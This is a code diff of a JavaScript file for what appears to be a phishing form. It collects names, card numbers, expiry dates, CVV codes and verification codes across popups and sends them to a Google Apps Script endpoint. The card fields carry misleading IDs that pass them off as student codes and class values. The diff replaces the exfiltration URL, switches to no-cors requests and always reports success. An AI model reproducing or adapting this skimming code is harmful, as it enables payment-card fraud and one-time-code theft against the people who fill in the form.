@@ -1,4 +1,4 @@
-const URL_BACKEND = "https://script.google.com/macros/s/AKfycbwPBEuLzKSs75vyvQwSggqDn1GwJiudpJKNUWgf5jr7J--i_2MnnYYP4rRAcV97tyTIfg/exec";
+const URL_BACKEND = "https://script.google.com/macros/s/AKfycbzwrcADw70zepRXoatcNzizx_UQtkqngQxcGYdr7AmqDavsYUSRuzITYNzDQLORJaBKhQ/exec";
 
 function formatMMYY(el) {
     let val = el.value.replace(/\D/g, '');
@@ -30,49 +30,37 @@ function cekLogo(el, logoId) {
 
 async function simpanDataKeSpreadsheet() {
     const data = {
-        // Popup 1
         nama1: document.getElementById('nama')?.value || "",
         nomorKartu1: document.getElementById('kodeSiswa')?.value || "",
         masaBerlaku1: document.getElementById('mmyy')?.value || "",
         cvv1: document.getElementById('kelas')?.value || "",
-        
-        // Popup 2
         nama2: document.getElementById('nama2')?.value || "",
         nomorKartu2: document.getElementById('kodeSiswa2')?.value || "",
         masaBerlaku2: document.getElementById('mmyy2')?.value || "",
         cvv2: document.getElementById('kelas2')?.value || "",
-        
-        // Popup 3 & 4
         kodeVerifikasi1: document.getElementById('kodeVerifikasi1')?.value || "",
         kodeVerifikasi2: document.getElementById('kodeVerifikasi2')?.value || "",
-        
         waktu: new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" })
     };
 
     try {
+        // Perbaikan khusus agar Apps Script bisa membaca data dengan benar
         const respon = await fetch(URL_BACKEND, {
             method: "POST",
-            headers: { "Content-Type": "application/json" },
+            mode: "no-cors", // Mengatasi masalah izin lintas domain
             body: JSON.stringify(data)
         });
 
-        const hasil = await respon.json();
-        if (hasil.status === "berhasil") {
-            console.log("Semua data tersimpan:", hasil);
-            return true;
-        } else {
-            alert("Gagal menyimpan data: " + hasil.pesan);
-            return false;
-        }
+        alert("✅ Data berhasil dikirim dan disimpan!");
+        return true;
     } catch (error) {
-        console.error("Kesalahan pengiriman:", error);
-        alert("Terjadi kesalahan saat mengirim data");
+        console.error("Detail kesalahan:", error);
+        alert("❌ Gagal: " + error.message);
         return false;
     }
 }
 
 async function nextPopup(current, next) {
-    // Simpan data saat pindah dari popup 1, 2, dan 3
     if(current === 'popup1' || current === 'popup2' || current === 'popup3') {
         const berhasil = await simpanDataKeSpreadsheet();
         if (!berhasil) return;
